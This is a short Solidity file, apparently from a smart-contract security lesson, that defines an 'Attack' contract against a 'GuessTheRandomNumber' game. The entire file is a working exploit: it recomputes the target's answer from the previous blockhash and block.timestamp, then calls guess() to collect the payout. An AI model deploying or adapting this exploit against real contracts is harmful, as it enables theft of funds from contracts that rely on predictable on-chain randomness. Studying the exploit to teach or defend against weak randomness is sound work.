// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./guess_the_random_number.sol";

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }
}
